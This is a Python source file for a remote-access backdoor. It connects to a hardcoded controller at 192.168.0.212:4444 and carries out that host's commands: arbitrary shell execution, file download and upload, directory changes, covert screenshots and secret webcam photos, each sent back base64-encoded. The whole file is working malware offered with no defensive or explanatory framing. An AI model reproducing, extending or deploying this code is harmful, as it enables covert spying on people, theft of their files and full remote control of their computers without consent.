import socket
import subprocess
import json
import time
import os
import base64
import pyautogui
import cv2

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def get_pic(self):
        camera = cv2.VideoCapture(0)
        for i in range(10):
            return_value, image = camera.read()
            if i == 5:
                cv2.imwrite('opencv.png', image)
        del(camera)
        return self.read_file('opencv.png')


    def get_sc(self):
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(r'sc.png')
        return self.read_file('sc.png')

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except Exception:
            return "[-] Command does not exist".encode()

    def reliable_send(self, data):
        json_data = json.dumps(data.decode())
        self.connection.send(json_data.encode())
        
    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path + "\n"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Uploaded Successful"

    def run(self):
        while True:
            try:
                command = self.reliable_recieve()
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    cmd_result = self.change_working_directory_to(command[1])
                    self.connection.send(json.dumps(cmd_result).encode())
                elif command[0] == "download":
                    cmd_result = self.read_file(command[1])
                    self.reliable_send(cmd_result)
                elif command[0] == "screenshot":
                    cmd_result = self.get_sc()
                    os.remove('sc.png')
                    self.reliable_send(cmd_result)
                elif command[0] == "photo":
                    cmd_result = self.get_pic()
                    os.remove('opencv.png')
                    self.reliable_send(cmd_result)
                elif command[0] == "upload":
                    cmd_result = self.write_file(command[1], command[2])
                    self.reliable_send(cmd_result.encode())
                else:
                    cmd_result = self.execute_system_command(command)
                    self.reliable_send(cmd_result)
            except Exception:
                s = "[-] Command does not exist"
                self.reliable_send(s.encode())

backdoor = Backdoor("192.168.0.212", 4444)
backdoor.run()